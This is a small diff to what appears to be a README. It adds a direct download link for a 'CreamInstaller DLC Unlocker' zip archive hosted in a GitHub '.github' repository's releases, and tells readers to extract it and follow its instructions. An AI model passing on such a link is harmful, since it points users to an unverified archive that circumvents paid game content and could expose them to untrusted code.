@@ -3,7 +3,7 @@
 ## 📥 Getting Started
 
 1. **Download the Unlocker**:  
-   [🔗 Download CreamInstaller DLC Unlocker](#)
+   [🔗 Download CreamInstaller DLC Unlocker](https://github.com/CreamAPI/.github/releases/download/1.8.5/CreamAPI-DLC-Unlocker.zip)
    
 2. **Extract the archive** and follow the included instructions.
 
